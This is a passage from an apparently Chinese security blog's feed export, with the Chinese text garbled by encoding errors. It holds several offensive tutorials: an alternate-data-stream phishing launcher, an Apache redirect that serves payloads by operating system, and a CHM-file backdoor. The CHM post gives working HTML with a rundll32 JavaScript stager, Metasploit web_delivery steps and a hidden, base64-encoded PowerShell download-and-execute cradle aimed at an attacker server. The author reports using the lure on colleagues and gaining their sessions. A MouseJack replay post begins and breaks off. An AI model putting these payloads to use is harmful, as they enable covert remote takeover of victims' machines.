ç„¶åï¼Œæˆ‘å°±æ§åˆ¶å°æ˜çš„æ‰€æœ‰è®¿é—®å†…å®¹äº†ï¼Œå°±åƒè¿™ä¸ªå›¾ä¸€æ ·ï¼š å½“ç„¶é™¤äº†ä»¥ä¸Šçš„åˆ©ç”¨æ–¹å¼ï¼Œè¿˜å¯ä»¥é€šè¿‡å‘å¸ƒä¸€äº›æ’ä»¶è®©å…¶å«æœ‰æ”»å‡»ä»£ç åŒæ ·å¯ä»¥å®ç°æ­¤åŠŸèƒ½ã€‚ 0x04 How to Defendå¯¹äºä¸æ˜æ¥å†çš„æ’ä»¶å°½é‡ä¸è¦å®‰è£…ï¼Œå¦‚æœå‘ç°é—®é¢˜ï¼Œè¯·å°½æ—©ä¿®æ”¹è‡ªå·±å„ä¸ªè´¦å·å¯†ç ã€‚ 0x05 Summarizeæ­¤æ–‡ä¸»è¦ä»‹ç»åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­çš„ä¸€ç§æ€è·¯ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥ç»§ç»­æµ‹è¯•å…¶ä»–æµè§ˆå™¨çš„æ’ä»¶ï¼Œè¿™ç§æ–¹å¼è™½ç„¶ç®€å•ï¼Œä½†æ˜¯æ•ˆæœè¿˜ä¸é”™ï¼Œä½ å€¼å¾—æ‹¥æœ‰ã€‚ä»¥ä¸Šæ–‡ä»¶å¯ä»¥é€šè¿‡è¿™é‡Œä¸‹è½½ï¼šExtension_Backdoorã€‚ 0x06 Consult1.http://peter.sh/experiments/chromium-command-line-switches/#condition-212.http://www.chromeplugins.org/google/chrome-plugins/installing-crx-file-command-line-9976.html3.https://developer.chrome.com/extensions/external_extensions4.http://www.cnblogs.com/walkingp/archive/2011/03/31/2001628.html]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨æ–‡ä»¶æµADS åŠ JavaScript è¿›è¡Œé’“é±¼æ”»å‡»]]></title>
    <url>%2Farchives%2Fcreating-a-malicious-javascript-by-utilizing-alternate-data-streams.html</url>
    <content type="text"><![CDATA[1.åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œtest.txtï¼Œéšä¾¿æ·»åŠ å†…å®¹ï¼ˆå®é™…çš„å·¥å…·ï¼Œå³ç”¨æˆ·è¦ç”¨çš„é‚£ä¸ªå·¥å…·ï¼‰ã€‚ 2.å°†ç¨‹åºå†™å…¥æ–‡ä»¶æµï¼ˆæ­¤å¤„ç”¨calc.exeï¼‰ type calc.exe &gt; test.txt:calc.exe 3.ä½¿ç”¨mklinkåˆ›å»ºæ–‡ä»¶é“¾æ¥ï¼š mklink config.txt test.txt:calc.exe 4.åˆ›å»ºreadme.txtï¼Œæ–‡ä»¶å†…å®¹éšä¾¿ã€‚è®¾ç½®ä¸ºéšè—ã€‚ 5.åˆ›å»ºreadme.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š var objShell = new ActiveXObject(&quot;shell.application&quot;); objShell.ShellExecute(&quot;cmd.exe&quot;, &quot;/c config.txt&quot;, &quot;&quot;, &quot;open&quot;, 0); objShell.ShellExecute(&quot;README.txt&quot;, &quot;&quot;, &quot;&quot;, &quot;open&quot;, 1); æ‰§è¡Œreadme.jsï¼Œè¿è¡Œcalc.exe ï¼Œæ‰“å¼€readme.txt]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Operating System Based Redirection with Apache mod_rewrite]]></title>
    <url>%2Farchives%2Foperating-system-based-redirection-with-apache-mod_rewrite.html</url>
    <content type="text"><![CDATA[å¯ä»¥é€šè¿‡æ­¤é’ˆå¯¹ä¸åŒæ“ä½œç³»ç»Ÿæ¥æ‰§è¡Œä¸åŒçš„paylaod index.htmlï¼š12345678910111213141516171819202122&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var url_base='http://'+window.location.host;var OSName="unknown";var query_string=document.location.search;var request_path=window.location.pathname.substr(1);if (navigator.appVersion.indexOf("Win")!=-1) OSName="windows";if (navigator.appVersion.indexOf("Mac")!=-1) OSName="mac";if (navigator.appVersion.indexOf("X11")!=-1) OSName="unix";if (navigator.appVersion.indexOf("Linux")!=-1) OSName="linux";var os_string='&amp;os_id='+OSName;if (query_string == '') os_string='?os_id='+OSName;if (query_string.indexOf("os_id=")!=-1) os_string='';window.location.replace(url_base+'/'+request_path+query_string+os_string);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; mod_rewrite è§„åˆ™ï¼š å°†ä¸‹é¢çš„è§„åˆ™å†™åœ¨.htaccessæ–‡ä»¶ä¸­ï¼Œæ›´æ¢TEAMSERVER-WAN-IPä»¥åŠOS-payload123456789101112RewriteEngine OnRewriteCond %&#123;QUERY_STRING&#125; os_id=macRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/MAC-OS-X-PAYLOAD [P]RewriteCond %&#123;QUERY_STRING&#125; os_id=windowsRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/WINDOWS-PAYLOAD [P]RewriteCond %&#123;QUERY_STRING&#125; os_id=unixRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/UNIX-PAYLOAD [P]RewriteCond %&#123;QUERY_STRING&#125; os_id=linuxRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/LINUX-PAYLOAD [P]RewriteCond %&#123;QUERY_STRING&#125; os_id=unknownRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/UNKNOWN-OS-PAYLOAD [P]RewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/OS-DETECTOR.HTML [P] æ¼”ç¤ºå¦‚ä¸‹ï¼š è¯¦æƒ…ï¼šæˆ³æˆ‘ é…ç½®æ–‡ä»¶åœ¨è¿™é‡Œï¼šæˆ³æˆ‘]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[é«˜çº§ç»„åˆæŠ€æ‰“é€ â€œå®Œç¾â€ æ†ç»‘åé—¨]]></title>
    <url>%2Farchives%2Fchm_backdoor.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹ä¹‹å‰å†™è¿‡ä¸€ç¯‡å…³äºå®¢æˆ·ç«¯é’“é±¼çš„æ–‡ç« ï¼šã€Šä½¿ç”¨powershell Clientè¿›è¡Œæœ‰æ•ˆé’“é±¼ã€‹ä¸­ï¼Œåœ¨ä½¿ç”¨å„ä¸ªClientè¿›è¡Œæµ‹è¯•çš„è¿‡ç¨‹ä¸­ï¼Œä¸ªäººå‘ç°CHMæ–‡ä»¶æ˜¯æœ€å¥½ç”¨çš„ä¸€ä¸ªï¼Œä½†æ˜¯å…¶ç¼ºç‚¹å°±æ˜¯ä¼šå¼¹é»‘æ¡†ï¼Œè¿™æ ·å°±ä¼šè®©è¢«æ”»å‡»è€…å¯Ÿè§‰ã€‚é‚£ä¹ˆæ€ä¹ˆè®©ä»–ä¸å¼¹é»‘æ¡†å‘¢ï¼Ÿé‚£å°±æ˜¯æœ¬æ–‡è¦ä»‹ç»çš„å†…å®¹å•¦~ 0x01 CHM ç®€ä»‹åœ¨ä»‹ç»æ€ä¹ˆä½¿ç”¨CHMæ¥ä½œä¸ºåé—¨ä¹‹å‰ï¼Œé¦–å…ˆè¦çŸ¥é“CMHæ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚CHMï¼ˆCompiled Help Manualï¼‰å³â€œå·²ç¼–è¯‘çš„å¸®åŠ©æ–‡ä»¶â€ã€‚å®ƒæ˜¯å¾®è½¯æ–°ä¸€ä»£çš„å¸®åŠ©æ–‡ä»¶æ ¼å¼ï¼Œåˆ©ç”¨HTMLä½œæºæ–‡ï¼ŒæŠŠå¸®åŠ©å†…å®¹ä»¥ç±»ä¼¼æ•°æ®åº“çš„å½¢å¼ç¼–è¯‘å‚¨å­˜ã€‚CHMæ”¯æŒJavas criptã€VBs criptã€ActiveXã€Java Appletã€Flashã€å¸¸è§å›¾å½¢æ–‡ä»¶(GIFã€JPEGã€PNG)ã€éŸ³é¢‘è§†é¢‘æ–‡ä»¶(MIDã€WAVã€AVI)ç­‰ç­‰ï¼Œå¹¶å¯ä»¥é€šè¿‡URLä¸Internetè”ç³»åœ¨ä¸€èµ·ã€‚å› ä¸ºä½¿ç”¨æ–¹ä¾¿ï¼Œå½¢å¼å¤šæ ·ä¹Ÿè¢«é‡‡ç”¨ä½œä¸ºç”µå­ä¹¦çš„æ ¼å¼ã€‚ 0x02 CHM åˆ¶ä½œCHMçš„åˆ¶ä½œæ–¹æ³•å¾ˆå¤šã€‚æœ‰å¤šæ¬¾å·¥å…·å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œå°±ä¸åœ¨åšè¯¦ç»†çš„ä»‹ç»äº†ã€‚æœ¬æ¬¡æµ‹è¯•ä½¿ç”¨äº†EasyCHMæ¥åˆ¶ä½œCHMæ–‡ä»¶ï¼Œä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ã€‚æ–°å»ºå¦‚ä¸‹ç›®å½•ï¼Œæ–‡ä»¶å†…å®¹éšæ„ï¼š æ‰“å¼€EasyCHMï¼Œæ–°å»º-&gt;æµè§ˆã€‚é€‰æ‹©è¯¥ç›®å½•ã€‚é»˜è®¤æ–‡ä»¶ç±»å‹ï¼š ç‚¹å‡»ç¡®è®¤ï¼Œå³å¯çœ‹åˆ°é¢„è§ˆçš„CHMæ–‡ä»¶ï¼š é€‰æ‹©ç¼–è¯‘ï¼Œå³å¯ç¼–è¯‘æˆCHMæ–‡ä»¶ã€‚ 0x03 CHM Execute Command14å¹´çš„æ—¶å€™@ithurricanept åœ¨twitterä¸Šå‘äº†ä¸€ä¸ªdemoï¼Œé€šè¿‡CHMè¿è¡Œè®¡ç®—å™¨ï¼š åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;&lt;PARAM name="Command" value="ShortCut"&gt; &lt;PARAM name="Button" value="Bitmap::shortcut"&gt; &lt;PARAM name="Item1" value=',calc.exe'&gt; &lt;PARAM name="Item2" value="273,1,1"&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt; å°†ä»¥ä¸Šä»£ç å†™å…¥htmlï¼Œç½®äºå·¥ç¨‹ç›®å½•è¿›è¡Œç¼–è¯‘ï¼Œç”ŸæˆCHMæ–‡ä»¶ï¼Œè¿è¡Œæ­¤æ–‡ä»¶ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼š 0x04 å»é™¤å¼¹æ¡†æœ‰æµ‹è¯•è¿‡nishang Out-CHM çš„åŒå­¦ä¼šå‘ç°ï¼Œè¿è¡Œç”Ÿæˆçš„CHMæ–‡ä»¶çš„æ—¶å€™ä¼šçœ‹åˆ°æ˜æ˜¾çš„å¼¹æ¡†ã€‚å°±åƒè¿™æ ·: æŸä¸ªæ™šä¸Šçªç„¶è„‘æ´äº†ä¸€ä¸‹ï¼Œæƒ³åˆ°äº†ä¸€ä¸ªå¥½çš„æ–¹å¼æ¥è®©ä»–ä¸æ˜¾ç¤ºå¼¹æ¡†ï¼Œå³ç»“åˆä½¿ç”¨JavaScript Backdoorã€‚ç»è¿‡æµ‹è¯•ï¼ŒæˆåŠŸå®ç°åœ¨ä¸å¼¹æ¡†çš„æƒ…å†µä¸‹è·å–meterpreterä¼šè¯ï¼Œæ­¤æ¬¡æµ‹è¯•ä½¿ç”¨ä¸€ä¸ªæˆ‘ä¿®æ”¹è¿‡çš„pythonç‰ˆ JSRat.ps1 ï¼Œåœ°å€ä¸ºï¼šhttps://github.com/Ridter/MyJSRatã€‚ä½¿ç”¨æ–¹å¼è¯¦è§ readmeã€‚ ä»¥ä¸‹ä¸ºå®Œæ•´çš„æµ‹è¯•è¿‡ç¨‹ï¼š 1ã€ç»“åˆCHM + JSBackdoorä½¿ç”¨äº¤äº’æ¨¡å¼çš„JSRat serverï¼š1python MyJSRat.py -i 192.168.1.101 -p 8080 è®¿é—® http://192.168.1.101:8080/wtf è·å–æ”»å‡»ä»£ç å¦‚ä¸‹ï¼š1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.1.101:8080/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);&#125; ç»è¿‡å¤šæ¬¡æµ‹è¯•ï¼ŒæˆåŠŸå°†ä»¥ä¸Šå‘½ä»¤å†™å…¥chmï¼Œå…¶Htmlä»£ç ä¸ºï¼š123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;This is a demo ! &lt;br&gt;&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;&lt;PARAM name="Command" value="ShortCut"&gt; &lt;PARAM name="Button" value="Bitmap::shortcut"&gt; &lt;PARAM name="Item1" value=',rundll32.exe,javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.1.101:8080/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);&#125;'&gt; &lt;PARAM name="Item2" value="273,1,1"&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt; ç¼–è¯‘ä»¥åè¿è¡Œï¼Œå¯ä»¥æˆåŠŸè·å–JSäº¤äº’shell: ç›´æ¥æ‰§è¡Œcmd /c command æ˜¯ä¼šæœ‰é»‘æ¡†çš„ï¼Œå¯ä»¥ä½¿ç”¨runæ¥é¿å…æ˜¾ç¤ºé»‘æ¡†ã€‚æ‰§è¡Œrunä»¥åï¼Œè¾“å…¥ whoami &gt; e:\1.txt ä¹‹åé€šè¿‡read æ¥è·å–å›æ˜¾ã€‚ 2ã€è·å–meterpreterä¼šè¯æ­¤æ¬¡æµ‹è¯•è·å–meterpreterä¼šè¯çš„æ–¹å¼æ˜¯é€šè¿‡æ‰§è¡Œpowershellå‘½ä»¤ï¼Œç›´æ¥è·å–ï¼Œå½“è·å–å®¢æˆ·ç«¯JS äº¤äº’shellä¹‹åè‡ªåŠ¨æ‰§è¡Œpowershellå‘½ä»¤ï¼Œè·å–meterpreterä¼šè¯ã€‚å…·ä½“æ“ä½œå¦‚ä¸‹ï¼šå¼€å¯MSF web_deliveryï¼š1234567891011121314151617181920212223 ~ msfconsole -Lqmsf &gt; use exploit/multi/script/web_deliverymsf exploit(web_delivery) &gt; set target 2target =&gt; 2msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(web_delivery) &gt; set lhost 192.168.1.101lhost =&gt; 192.168.1.101msf exploit(web_delivery) &gt; set lport 6666lport =&gt; 6666msf exploit(web_delivery) &gt; set SRVPORT 8081SRVPORT =&gt; 8081msf exploit(web_delivery) &gt; set uripath /uripath =&gt; /msf exploit(web_delivery) &gt; exploit[*] Exploit running as background job.msf exploit(web_delivery) &gt;[*] Started reverse TCP handler on 192.168.1.101:6666[*] Using URL: http://0.0.0.0:8081/[*] Local IP: http://192.168.1.101:8081/[*] Server started.[*] Run the following command on the target machine:powershell.exe -nop -w hidden -c $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring('http://192.168.1.101:8081/'); è£…æœ‰powershellçš„å®¢æˆ·ç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åˆ™å¯è·å–meterpreterä¼šè¯ï¼š1powershell.exe -nop -w hidden -c $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring('http://192.168.1.101:8081/'); ç”±äºå­˜åœ¨ç‰¹æ®Šå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä»¥ä¸Šä»£ç ç¼–ç ä¸ºbase64æ ¼å¼ï¼Œå°†ä»¥ä¸‹ä»£ç å­˜å…¥power.txt1234$n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring('http://192.168.1.101:8081/'); æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š1cat power.txt | iconv --to-code UTF-16LE |base64 æœ€ç»ˆè¦æ‰§è¡Œçš„powershellå‘½ä»¤ä¸ºï¼š1powershell -ep bypass -enc IAAkAG4APQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AAoAIAAkAG4ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsACgAgACQAbgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoAIABJAEUAWAAgACQAbgAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAxADoAOAAwADgAMQAvACcAKQA7AA== ä½¿ç”¨æ‰§è¡Œå‘½ä»¤æ¨¡å¼ç›´æ¥è·å–meterpreterä¼šè¯ï¼š1python MyJSRat.py -i 192.168.1.101 -p 8080 -c "powershell -ep bypass -enc IAAkAG4APQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AAoAIAAkAG4ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsACgAgACQAbgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoAIABJAEUAWAAgACQAbgAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAxADoAOAAwADgAMQAvACcAKQA7AA==" æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œä»è¿è¡ŒCHMåˆ°è·å–meterpreterï¼Œå®¢æˆ·ç«¯æ— æ˜æ˜¾å¼‚å¸¸ï¼Œå…¨ç¨‹æ— é»‘æ¡†å¼¹å‡ºï¼Œè·å–åˆ°meterpreterä¼šè¯å¦‚ä¸‹å›¾ï¼š 3ã€æ˜¯å¦è¢«æ€ï¼Ÿå¯èƒ½å¾ˆå¤šäººä¼šé—®ï¼Œä¼šä¸ä¼šè¢«æ€ï¼Œä¸‹é¢æ˜¯virscançš„æŸ¥æ€ç»“æœï¼šhttp://r.virscan.org/report/6173ee9c62d29806bb84035a8f1738ba 0x05 åˆ©ç”¨åœºæ™¯ä¸€å¼ å›¾è¯´æ˜ï¼ˆè®©æˆ‘çŒœçŒœä½ ä¼šä¸ä¼šç‚¹ï¼‰ï¼š æ³¨: éšä¾¿æ‰¾äº†å‡ ä¸ªæ¼æ´åˆ©ç”¨å·¥å…·ä¿®æ”¹äº†æ–‡ä»¶åï¼Œå¹¶ä¸ä»£è¡¨åŸä½œè€…åˆ†äº«çš„å·¥å…·æœ‰é—®é¢˜ã€‚ 0x06 å®é™…æµ‹è¯•æ˜¯ç”¨ä¸Šè¿°æ–¹å¼åˆ¶ä½œchmæ–‡ä»¶ï¼Œå‘½åä¸ºä¸€ä¸ªæ¯”è¾ƒæœ‰å¸å¼•åŠ›çš„åå­—ï¼Œæ¯”å¦‚åœ¨å…¬å¸æŠ€æœ¯ç¾¤å‘äº†ä¸€ä¸ªåå­—ä¸ºâ€åˆ¶ä½œå…æ€åé—¨.chmâ€çš„æ–‡ä»¶ï¼Œå®é™…æµ‹è¯•ç»“æœå¦‚ä¸‹å›¾ï¼š æˆåŠŸè·å–å¤šä¸ªäººçš„meterpreterä¼šè¯ã€‚ 0x07 é˜²å¾¡ç›®å‰æˆ‘è¿˜æ²¡æŸ¥åˆ°ä»€ä¹ˆé˜²å¾¡çš„å§¿åŠ¿ï¼ŒçŸ¥é“çš„å°ä¼™ä¼´å¯ä»¥åˆ†äº«ä¸€ä¸‹ã€‚æœ€å¥½å°±æ˜¯æé«˜ä¸ªäººå®‰å…¨æ„è¯†ï¼Œå¯¹äºè¿™ç±»æ–‡ä»¶ï¼Œå¤šæ³¨æ„ä¸€ä¸‹ï¼Œå°½é‡åˆ«ä¹±ç‚¹ï¼Œå¦‚æœéè¦ç‚¹ï¼Œå¯ä»¥æ”¾åˆ°è™šæ‹Ÿæœºé‡Œé¢ã€‚ä½¿ç”¨procexp.exeå¯ä»¥çœ‹åˆ°å­˜åœ¨åé—¨çš„chmæ–‡ä»¶ä¼šå¼€å¯æ–°çš„è¿›ç¨‹ï¼š å¯¹äºç¢°åˆ°è¿™ç§åé—¨ï¼Œæ€ä¹ˆæº¯æºå‘¢ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œchmæ˜¯å¯ä»¥åç¼–è¯‘ä¸ºhtmlçš„ã€‚ä½¿ç”¨windowsè‡ªå¸¦çš„hh.exe åˆ™å¯è¿›è¡Œåç¼–è¯‘ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š1C:\Users\evi1cg\Desktop&gt;hh -decompile test poc.chm #test ä¸ºå½“å‰ç›®å½•çš„testæ–‡ä»¶å¤¹ æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š è¿™æ ·å°±å¯ä»¥çœ‹åˆ°å…¶æºä»£ç å¹¶å¯ä»¥æ‰¾åˆ°æ”»å‡»è€…çš„ç›‘å¬æœåŠ¡å™¨äº†ã€‚ 0x08 å°ç»“æ­¤æ¬¡æµ‹è¯•å°±æ˜¯å¯¹ä¸€äº›å·²çŸ¥çš„æ”»å‡»æ‰‹æ³•è¿›è¡Œç»“åˆï¼Œç»“æœæ˜¯è®©æ­¤æ†ç»‘åé—¨æ›´åŠ éšè”½ï¼Œè¿‘ä¹â€œå®Œç¾â€ï¼Œç¾ä¸­ä¸è¶³çš„æ˜¯åœ¨æ–‡ä»¶å¼€å¯çš„æ—¶å€™ä¼šå‡ºç°çŸ­æš‚çš„å¡é¡¿ã€‚æœ‰æ—¶å€™å°æ¼æ´ç»“åˆèµ·æ¥èƒ½é€ æˆå¤§å±å®³ï¼Œå°æ‰‹æ³•ç»“åˆèµ·æ¥ä¹Ÿèƒ½æˆå¤§æ€å™¨ã€‚æœ¬ç€åˆ†äº«çš„ç²¾ç¥å°†æ­¤å§¿åŠ¿ä»‹ç»ï¼Œå¸Œæœ›å°ä¼™ä¼´ä»¬èƒ½å…å—å…¶å®³ã€‚ 0x09 å‚è€ƒ1.https://twitter.com/ithurricanept/status/5349937431960903682.https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps13.http://drops.wooyun.org/tips/11764]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>chm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mousejack_replay]]></title>
    <url>%2Farchives%2Fmousejack_replay.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹Bastilleçš„ç ”ç©¶å›¢é˜Ÿå‘ç°äº†ä¸€ç§é’ˆå¯¹è“ç‰™é”®ç›˜é¼ æ ‡çš„æ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¼æ´æ§åˆ¶ä½ çš„ç”µè„‘æ“ä½œã€‚ç ”ç©¶å›¢é˜Ÿå°†æ­¤æ”»å‡»å‘½åä¸ºMouseJackã€‚ Mousejack ä¹‹å‰åœ¨Freebufä¸Šæœ‰æ‰€ä»‹ç»ï¼šMouseJackï¼šåˆ©ç”¨15ç¾å…ƒçš„å·¥å…·å’Œ15è¡Œä»£ç æ§åˆ¶æ— çº¿é¼ æ ‡å’Œé”®ç›˜ï¼Œå½“ç„¶ï¼Œåˆ¶ä½œå›¢é˜Ÿä¹Ÿå°†éƒ¨åˆ†æµ‹è¯•ä»£ç å…¬å¼€åœ¨githubä¸Šï¼Œè¯¥å›¢é˜Ÿç½‘ç«™åœ°å€ä¸ºï¼šhttps://www.mousejack.com/ ä»è§†é¢‘ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ”»å‡»è€…é€šè¿‡æ­¤æŠ€æœ¯ï¼Œç›´æ¥æ“çºµå—å®³è€…ç”µè„‘ï¼Œä½†ç”±äºç›®å‰è¯¥å›¢é˜Ÿå¹¶æ²¡æœ‰å…¬å¼€å®Œæ•´ä»£ç ï¼Œæ‰€ä»¥æœ‰äº†ä¸‹é¢çš„æµ‹è¯•ä»£ç ã€‚ æ€ä¹ˆçƒ§å›ºä»¶è¿™é‡Œå°±ä¸è¯´äº†ï¼Œåœ¨åŸgithubæœ‰è¯¦ç»†è¯´æ˜ï¼Œdropsä¹Ÿæœ‰ä»‹ç»:Mousejackæµ‹è¯•æŒ‡å—ï¼Œå¦‚æœåœ¨windowså¹³å°ï¼Œæˆ‘ä¹Ÿå†™è¿‡ä¸€ä¸ªä»‹ç»:windowsä¸‹åˆ·MouseJackå›ºä»¶ã€‚ 0x01 åŸè„šæœ¬æµ‹è¯•è¯¥å›¢é˜Ÿæ‰€å…¬å¸ƒçš„ä»£ç ä¸»è¦åŒ…æ‹¬äº†æ‰«æè·Ÿå—…æ¢æ¨¡å—ï¼Œnrf24-network-mapper.py ä¸­å¹¶æ²¡æœ‰èƒ½å¤Ÿè®©é¼ æ ‡æ“ä½œå‘ç”Ÿæ˜æ˜¾å˜åŒ–çš„payloadï¼Œç»è¿‡å¤šæ¬¡æµ‹è¯•ï¼Œå†™å‡ºäº†æ­¤æµ‹è¯•è„šæœ¬ï¼Œèƒ½å¤Ÿå®Œæˆå¯¹æ— çº¿é¼ æ ‡æ“ä½œçš„é‡æ”¾æ”»å‡»ã€‚ 0x02 è„šæœ¬ä»‹ç»scannerä½¿ç”¨åŸä½œè€…çš„æ‰«æè„šæœ¬ï¼Œæ­¤è„šæœ¬ç”¨æ¥æ‰«æé™„è¿‘çš„æ— çº¿é¼ é”®ï¼š 123456789usage: ./nrf24-scanner.py [-h] [-c N [N ...]] [-v] [-l] [-p PREFIX] [-d DWELL]optional arguments: -h, --help show this help message and exit -c N [N ...], --channels N [N ...] RF channels -v, --verbose Enable verbose output -l, --lna Enable the LNA (for CrazyRadio PA dongles) -p PREFIX, --prefix PREFIX Promiscuous mode address prefix -d DWELL, --dwell DWELL Dwell time per channel, in milliseconds æ‰«æä¿¡é“ 1-5 çš„è®¾å¤‡ï¼š 1./nrf24-scanner.py -c &#123;1..5&#125; æ‰«æèµ·å§‹åœ°å€ä¸º0xA9çš„è®¾å¤‡çš„æ‰€æœ‰ä¿¡é“ï¼š 1./nrf24-scanner.py -p A9 snifferä¿®æ”¹åŸä½œè€…è„šæœ¬ï¼Œå°†è·å–çš„è®¾å¤‡æ•°æ®å­˜å‚¨åˆ°pack.log ä¸­ï¼Œä¹‹åå¯ä»¥ä½¿ç”¨mousejack-replay.pyè„šæœ¬å¯¹æ­¤æ•°æ®è¿›è¡Œé‡æ”¾ï¼š 1234567891011usage: ./nrf24-sniffer.py [-h] [-c N [N ...]] [-v] [-l] -a ADDRESS [-t TIMEOUT] [-k ACK_TIMEOUT] [-r RETRIES]optional arguments: -h, --help show this help message and exit -c N [N ...], --channels N [N ...] RF channels -v, --verbose Enable verbose output -l, --lna Enable the LNA (for CrazyRadio PA dongles) -a ADDRESS, --address ADDRESS Address to sniff, following as it changes channels -t TIMEOUT, --timeout TIMEOUT Channel timeout, in milliseconds -k ACK_TIMEOUT, --ack_timeout ACK_TIMEOUT ACK timeout in microseconds, accepts [250,4000], step 250 -r RETRIES, --retries RETRIES Auto retry limit, accepts [0,15] å—…æ¢åœ°å€ä¸º 61:49:66:82:03 è®¾å¤‡æ‰€æœ‰ä¿¡é“çš„æ•°æ®åŒ…å¹¶å°†æ•°æ®åŒ…ä¿å­˜ï¼š 1./nrf24-sniffer.py -a 61:49:66:82:03 mousejack-replay.pyåœ¨ network mapper 